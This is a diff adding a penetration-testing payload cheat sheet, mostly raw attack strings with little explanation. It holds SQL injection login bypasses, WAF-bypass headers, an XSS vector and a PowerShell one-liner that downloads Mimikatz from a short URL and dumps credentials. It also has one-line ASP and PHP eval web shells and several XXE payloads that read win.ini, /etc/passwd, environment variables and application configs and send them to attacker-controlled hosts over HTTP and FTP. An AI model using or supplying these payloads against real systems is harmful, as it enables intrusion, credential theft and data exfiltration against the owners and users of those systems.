@@ -1,0 +1,170 @@
+Waf bypass
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+
+Login bypass
+admin' --  
+admin' #  
+admin'/*  
+' or 1=1--  
+' or 1=1#  
+' or 1=1/*  
+') or '1'='1--  
+') or ('1'='1--
+
+-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
+' OR '1'='1' --
+' OR '1'='1' /*
+-- MySQL
+' OR '1'='1' #
+-- Access (using null characters)
+' OR '1'='1' %00
+' OR '1'='1' %16
+
+Linkler : 
+
+https://downloads.skullsecurity.org/passwords/
+http://garage4hackers.com/showthread.php?t=326 sap
+https://penetrate.io/page/2/ url encoding
+https://github.com/musalbas/address-spoofing-poc chrome
+
+
+CSRF TEST :
+
+Remove the csrftoken request variable completely. It may only validate it when it is present in the request.
+Put an invalid csrftoken value, i.e. &csrftoken=asdf. This is the fastest way to test what happens with a valid/invalid token.
+Have the csrftoken request variable present but do not set a value, i.e. &csrftoken=
+Try old csrftoken values that should have expired.
+See if a valid csrftoken for a user is valid for other users.
+
+New XSS vector :
+
+https://respectxss.blogspot.co.uk/2015/11/the-insecurity-of-ezdata.html
+
+The above screen-shot shows that the parenthesis (i.e., ()) have been filtered from the XSS payload which makes the attack vector useless. No worries. ECMAScript 6 (ECMA6) provides a feature called multi-line template string and with the help of it, one can execute JavaScript without parenthesis. The back-tick (``) is used instead of parenthesis for JavaScript code execution. The payload now becomes ...
+
+'-confirm`1`-'
+
+Mimikatz:
+powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
+
+
+/FCKeditor/editor/filemanager/browser/default/browser.html
+/FCKeditor/editor/filemanager/browser/default/connectors/test.html
+/FCKeditor/editor/filemanager/connectors/uploadtest.html
+/FCKeditor/editor/filemanager/upload/test.html
+/fckeditor/editor/filemanager/browser/default/connectors/test.html
+/fckeditor/editor/filemanager/connectors/test.html
+
+ASPX: <%@ PageLanguage="Jscript"%>
+ASP : <%eval(Request.Item["cmd"],"unsafe");%>
+PHP: <?php @eval($_REQUEST["cmd"]); ?>
+
+XXE
+-----------
+
+--------------------------------------------------------------
+Vanilla, used to verify outbound xxe or blind xxe
+--------------------------------------------------------------
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
+]>
+<r>&sp;</r>
+
+---------------------------------------------------------------
+OoB extraction
+---------------------------------------------------------------
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+
+## External dtd: ##
+
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
+
+----------------------------------------------------------------
+OoB variation of above (seems to work better against .NET)
+----------------------------------------------------------------
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
+%sp;
+%param1;
+%exfil;
+]>
+
+## External dtd: ##
+
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
+
+-----------------------------------------------------------------------
+OoB extra nice
+-----------------------------------------------------------------------
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY % start "<![CDATA[">
+ <!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml ">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://evil/evil.xml">
+%dtd;
+]>
+<root>&all;</root>
+ 
+## External dtd: ##
+ 
+<!ENTITY all "%start;%stuff;%end;">
+
+------------------------------------------------------------------
+File-not-found exception based extraction
+------------------------------------------------------------------
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [  
+  <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >
+  %one;
+  %two;
+  %four;
+]>
+
+## External dtd: ##
+
+<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
+
+-------------------------^ you might need to encode this % (depends on your target) as: &#x25;
+
+--------------
+FTP
+--------------
+<?xml version="1.0" ?>
+<!DOCTYPE a [ 
+<!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd">
+%asd;
+%c;
+]>
+<a>&rrr;</a>
+
+
+## External dtd ##
+<!ENTITY % d SYSTEM "file:///proc/self/environ">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
+
+---------------------------
+Inside SOAP body
+---------------------------
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
